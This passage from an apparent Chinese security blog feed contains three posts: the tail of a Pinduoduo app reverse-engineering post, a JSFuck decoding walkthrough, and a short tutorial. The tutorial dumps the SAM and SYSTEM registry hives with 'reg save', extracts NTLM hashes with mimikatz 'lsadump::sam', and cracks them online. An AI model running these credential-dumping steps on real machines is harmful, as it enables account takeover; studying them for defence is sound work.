quot;:0,&quot;text&quot;:&quot;怎么在拼多多下单&quot;,&quot;type&quot;:&quot;menu_item&quot;&#125;,&#123;&quot;click_action&quot;:&#123;&quot;name&quot;:&quot;send_message&quot;,&quot;params&quot;:&#123;&quot;content&quot;:&quot;下单后如何支付&quot;&#125;&#125;,&quot;hide&quot;:0,&quot;text&quot;:&quot;下单后如何支付&quot;,&quot;type&quot;:&quot;menu_item&quot;&#125;,&#123;&quot;click_action&quot;:&#123;&quot;name&quot;:&quot;send_message&quot;,&quot;params&quot;:&#123;&quot;content&quot;:&quot;哪里可以看到我的订单&quot;&#125;&#125;,&quot;hide&quot;:0,&quot;text&quot;:&quot;哪里可以看到我的订单&quot;,&quot;type&quot;:&quot;menu_item&quot;&#125;,&#123;&quot;click_action&quot;:&#123;&quot;name&quot;:&quot;send_message&quot;,&quot;params&quot;:&#123;&quot;content&quot;:&quot;拼多多有哪些活动&quot;&#125;&#125;,&quot;hide&quot;:0,&quot;text&quot;:&quot;拼多多有哪些活动&quot;,&quot;type&quot;:&quot;menu_item&quot;&#125;],&quot;template&quot;:&quot;text_with_menu_items&quot;,&quot;version&quot;:1&#125;,&quot;status&quot;:&quot;unread&quot;,&quot;template_name&quot;:&quot;parrot_rich_text_with_menu_item&quot;,&quot;to&quot;:&#123;&quot;role&quot;:&quot;user&quot;,&quot;uid&quot;:&quot;5564948642776&quot;&#125;,&quot;ts&quot;:&quot;1579261690&quot;,&quot;type&quot;:0,&quot;unread_count&quot;:1,&quot;user_has_read&quot;:true&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-拼多多数据库&quot;&gt;&lt;a href=&quot;#0x00-拼多多数据库&quot; class=&quot;headerlink&quot; title=&quot;0x00 拼多多数据库&quot;&gt;&lt;/a&gt;0x00 拼多多数据库&lt;/h2&gt;&lt;p&gt;在拼多多数据库中其中的&lt;code&gt;t_mall_conversati
      
    
    </summary>
    
    
      <category term="逆向" scheme="https://vxer-lee.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="Android逆向" scheme="https://vxer-lee.github.io/tagsssss/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Mimikatz破解Windows登陆密码</title>
    <link href="https://vxer-lee.github.io/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81.html"/>
    <id>https://vxer-lee.github.io/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81.html</id>
    <published>2020-01-07T04:50:11.000Z</published>
    <updated>2020-08-13T06:29:34.267Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和SYSTEM文件，离线读取出NTML HASH，其实也可以用procdump64和mimikatz抓取Windows用户密码，这个小技巧算是另外一种方式吧</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>首先导出两个文件，可能需要管理员权限 ，CMD或者Powershell运行都可以。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure><p><img src="/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/1.png" alt="img"></p><p>然后将这两个hive文件放到和Mimikatz同一个目录下，你可将目标机器的这两个文件拖出来到自己机器上尝试</p><p>mimikatz下载链接：<a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200809" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200809</a></p><p><img src="/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/2.png" alt="img"><br>.</p><p>运行mimikatz，输入命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure><p><img src="/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/ntlm.png" alt="img"><br>获取NTML后，我们对其进行解密，就随便找个稍微好用的解密网站就行，这里用cmd5进行解密<br><img src="/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/123456.png" alt="img"><br>.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;使用场景&quot;&gt;&lt;a href=&quot;#使用场景&quot; class=&quot;headerlink&quot; title=&quot;使用场景&quot;&gt;&lt;/a&gt;使用场景&lt;/h2&gt;&lt;p&gt;已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和S
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://vxer-lee.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网攻防" scheme="https://vxer-lee.github.io/tagsssss/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>熬夜之干JS加密</title>
    <link href="https://vxer-lee.github.io/%E7%86%AC%E5%A4%9C%E4%B9%8B%E5%B9%B2JS%E5%8A%A0%E5%AF%86.html"/>
    <id>https://vxer-lee.github.io/%E7%86%AC%E5%A4%9C%E4%B9%8B%E5%B9%B2JS%E5%8A%A0%E5%AF%86.html</id>
    <published>2020-01-07T03:59:36.000Z</published>
    <updated>2020-08-01T14:38:30.494Z</updated>
    
    <content type="html"><![CDATA[<p>朋友发了这么一段东西，然后和我说熬夜也要把它解出来  我：？？？？？？？？</p><p>没错经过一番搜索后发现这是一段加密的JS代码。</p><p>(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+(![]+[])[+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]</p><p>这是一段Js代码，利用js引擎语法 运算符 优先级等特性，让代码看起来特别难懂复杂。</p><blockquote><p>首先要运用到的第一个知识就是js运算符的优先级，因为这么长一段运算看的人眼花，我们必须得先根据优先级分成n小段，然后再各个击破。优先级的排列如下表：</p></blockquote><p>　　</p><h4 id="优先级从高到低："><a href="#优先级从高到低：" class="headerlink" title="优先级从高到低："></a>优先级从高到低：</h4><table><thead><tr><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>.[ ] ( )</td><td>字段访问、数组索引、函数调用和表达式分组</td></tr><tr><td>++ – - ~ ! delete new typeof void</td><td>一元运算符、返回数据类型、对象创建、未定义的值</td></tr><tr><td>* / %</td><td>相乘、相除、求余数</td></tr><tr><td>+ - +</td><td>相加、相减、字符串串联</td></tr><tr><td>&lt;&lt; &gt;&gt; &gt;&gt;&gt;</td><td>移位</td></tr><tr><td>&lt; &lt;= &gt; &gt;= instanceof</td><td>小于、小于或等于、大于、大于或等于、是否为特定类的实例</td></tr><tr><td>== != === !==</td><td>相等、不相等、全等，不全等</td></tr><tr><td>&amp;</td><td>按位“与”</td></tr><tr><td>^</td><td>按位“异或”</td></tr><tr><td>|</td><td>按位“或”</td></tr><tr><td>&amp;&amp;</td><td>逻辑“与”</td></tr><tr><td>||</td><td>逻辑“或”</td></tr><tr><td>?:</td><td>条件运算</td></tr><tr><td>= <em>OP</em>=</td><td>赋值、赋值运算（如 += 和 &amp;=）</td></tr><tr><td>,</td><td>多个计算</td></tr></tbody></table><h4 id="代码拆分"><a href="#代码拆分" class="headerlink" title="代码拆分"></a>代码拆分</h4><p>根据（）和[] 代码一共可以拆分成28段。</p><p>其实这28段代表的就是 e9a699e6b8af3731e78bace7ab8b 个字节</p><h4 id="举例第一段"><a href="#举例第一段" class="headerlink" title="举例第一段:"></a>举例第一段:</h4><p>(!![]+[])[!+[]+!+[]+!+[]]        把() 和 []分开来就是</p><p>(!![]+[]).       等于  true</p><p>[!+[]+!+[]+!+[]]   等于 3 </p><p>然后合起来就是”true”[3] 意思就是 取”true”这个字符串 从0开始到第3个字符, 也就是e</p><p><img src="/%E7%86%AC%E5%A4%9C%E4%B9%8B%E5%B9%B2JS%E5%8A%A0%E5%AF%86/image-20190803024505492.png" alt="image-20190803024505492"></p><p><img src="/%E7%86%AC%E5%A4%9C%E4%B9%8B%E5%B9%B2JS%E5%8A%A0%E5%AF%86/image-20190803024531220.png" alt="image-20190803024531220"></p><h4 id="举例第二段："><a href="#举例第二段：" class="headerlink" title="举例第二段："></a>举例第二段：</h4><p>第二段则是 !+[] 代表1    一共是 9个1相加</p><p>!+[]    !+[]    !+[]   !+[]   !+[]   !+[]   !+[]   !+[]   !+[]  </p><p><img src="/%E7%86%AC%E5%A4%9C%E4%B9%8B%E5%B9%B2JS%E5%8A%A0%E5%AF%86/image-20190803024927010.png" alt="image-20190803024927010"></p><p><strong>所以第一段和第二段加起来就是e9,也就是那段e9a699e6b8af3731e78bace7ab8b 前两个字</strong></p><p><strong>后面的段以此类推</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一段</span></span><br><span class="line">(!![]+[])[!+[]+!+[]+!+[]]  </span><br><span class="line">+</span><br><span class="line"><span class="comment">//第二段</span></span><br><span class="line">[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]] </span><br><span class="line">+</span><br><span class="line"><span class="comment">//第三段</span></span><br><span class="line">(![]+[])[+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第四段</span></span><br><span class="line">[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第五段</span></span><br><span class="line">[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第六段</span></span><br><span class="line">[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第七段</span></span><br><span class="line">(!![]+[])[!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第八段</span></span><br><span class="line">[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第九段</span></span><br><span class="line">([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第十段</span></span><br><span class="line">[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第十一段</span></span><br><span class="line">(![]+[])[+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第十二段</span></span><br><span class="line">(![]+[])[+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第十三段</span></span><br><span class="line">[!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第十四段</span></span><br><span class="line">[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第十五段</span></span><br><span class="line">[!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第十六段</span></span><br><span class="line">[+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第十七段</span></span><br><span class="line">(!![]+[])[!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第十八段</span></span><br><span class="line">[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第十九段</span></span><br><span class="line">[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第二十段</span></span><br><span class="line">([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第二十一段</span></span><br><span class="line">(![]+[])[+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第二十二段</span></span><br><span class="line">([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第二十三段</span></span><br><span class="line">(!![]+[])[!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第二十四段</span></span><br><span class="line">[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第二十五段</span></span><br><span class="line">(![]+[])[+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第二十六段</span></span><br><span class="line">([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第二十七段</span></span><br><span class="line">[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span><br><span class="line">+</span><br><span class="line"><span class="comment">//第二十八段</span></span><br><span class="line">([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]</span><br></pre></td></tr></table></figure><p><strong>python拟代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line"></span><br><span class="line"><span class="comment">#e9a699e6b8af3731e78bace7ab8b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#(!![]+[])[!+[]+!+[]+!+[]]</span></span><br><span class="line"><span class="comment">#[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span></span><br><span class="line">sub1 = <span class="number">1</span>&lt;<span class="number">2</span></span><br><span class="line">sub1_end = str(sub1)[<span class="number">3</span>] + str(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">print</span> sub1_end            <span class="comment">#e9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#(![]+[])[+!+[]]</span></span><br><span class="line"><span class="comment">#[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span></span><br><span class="line">sub2 = <span class="number">1</span>&gt;<span class="number">2</span></span><br><span class="line">sub2_end = str(sub2)[<span class="number">1</span>] + str(<span class="number">6</span>)</span><br><span class="line"><span class="keyword">print</span> sub2_end            <span class="comment">#a6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span></span><br><span class="line"><span class="comment">#[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span></span><br><span class="line">sub3 = <span class="number">9</span></span><br><span class="line">sub3_end = str(sub3) + str(sub3)</span><br><span class="line"><span class="keyword">print</span> sub3_end           <span class="comment">#99</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#(!![]+[])[!+[]+!+[]+!+[]]</span></span><br><span class="line"><span class="comment">#[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span></span><br><span class="line">sub4 = <span class="number">1</span>&lt;<span class="number">2</span></span><br><span class="line">sub4_end = str(sub4)[<span class="number">3</span>] + str(<span class="number">6</span>)</span><br><span class="line"><span class="keyword">print</span> sub4_end           <span class="comment">#e6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]</span></span><br><span class="line"><span class="comment">#[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span></span><br><span class="line">sub5 = <span class="string">'[object Array Iterator]'</span></span><br><span class="line">sub5_end = sub5[<span class="number">2</span>] + str(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> sub5_end           <span class="comment">#b8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#(![]+[])[+!+[]]</span></span><br><span class="line"><span class="comment">#(![]+[])[+[]]</span></span><br><span class="line">sub6 = <span class="number">1</span>&gt;<span class="number">2</span></span><br><span class="line">sub6_end = str(sub6)[<span class="number">1</span>] + str(sub6).lower()[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> sub6_end           <span class="comment">#af</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[!+[]+!+[]+!+[]]</span></span><br><span class="line"><span class="comment">#[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]                </span></span><br><span class="line">sub7 = <span class="number">3</span></span><br><span class="line">sub7_end = str(sub7) + str(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">print</span> sub7_end           <span class="comment">#37</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[!+[]+!+[]+!+[]]</span></span><br><span class="line"><span class="comment">#[+!+[]]</span></span><br><span class="line">sub8 = <span class="number">3</span></span><br><span class="line">sub8_end = str(sub8) + str(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> sub8_end           <span class="comment">#31</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#(!![]+[])[!+[]+!+[]+!+[]]</span></span><br><span class="line"><span class="comment">#[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span></span><br><span class="line">sub9 = <span class="number">1</span>&lt;<span class="number">2</span></span><br><span class="line">sub9_end = str(sub9)[<span class="number">3</span>] + str(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">print</span> sub9_end           <span class="comment">#e7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span></span><br><span class="line"><span class="comment">#([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]</span></span><br><span class="line">sub10 = <span class="string">'[object Array Iterator]'</span></span><br><span class="line">sub10_end = str(<span class="number">8</span>) + sub10[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">print</span> sub10_end          <span class="comment">#8b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#(![]+[])[+!+[]]</span></span><br><span class="line"><span class="comment">#([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]</span></span><br><span class="line">sub11 = <span class="number">1</span>&gt;<span class="number">2</span></span><br><span class="line">sub11_end = str(sub11)[<span class="number">1</span>] + <span class="string">'[object Array Iterator]'</span>[<span class="number">5</span>]</span><br><span class="line"><span class="keyword">print</span> sub11_end          <span class="comment">#ac</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#(!![]+[])[!+[]+!+[]+!+[]]</span></span><br><span class="line"><span class="comment">#[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span></span><br><span class="line">sub12 = <span class="number">1</span>&lt;<span class="number">2</span></span><br><span class="line">sub12_end = str(sub12)[<span class="number">3</span>] + str(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">print</span> sub12_end          <span class="comment">#e7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#(![]+[])[+!+[]]</span></span><br><span class="line"><span class="comment">#([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]</span></span><br><span class="line">sub13 = <span class="number">1</span>&gt;<span class="number">2</span></span><br><span class="line">sub13_end = str(sub13)[<span class="number">1</span>] + <span class="string">'[object Array Iterator]'</span>[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">print</span> sub13_end          <span class="comment">#ab</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]</span></span><br><span class="line"><span class="comment">#([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]</span></span><br><span class="line">sub14 = <span class="string">'[object Array Iterator]'</span></span><br><span class="line">sub14_end = str(<span class="number">8</span>) + str(sub14)[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">print</span> sub14_end         <span class="comment">#8b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'----------------------------------------'</span></span><br><span class="line">decodestr = sub1_end+sub2_end+sub3_end+sub4_end+sub5_end+sub6_end+sub7_end+sub8_end+sub9_end+sub10_end+sub11_end+sub12_end+sub13_end+sub14_end</span><br><span class="line"><span class="keyword">print</span> decodestr</span><br><span class="line"><span class="keyword">print</span> <span class="string">'========================================'</span></span><br><span class="line">no = binascii.a2b_hex(decodestr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> no</span><br></pre></td></tr></table></figure><p>最后的执行结果</p><p>WTF ？？？？？ 这是有人在搞事情？</p><p><img src="/%E7%86%AC%E5%A4%9C%E4%B9%8B%E5%B9%B2JS%E5%8A%A0%E5%AF%86/ssdd.png" alt="ssdd"></p>]]></content>
    
    <summary type="html">
    
      
      
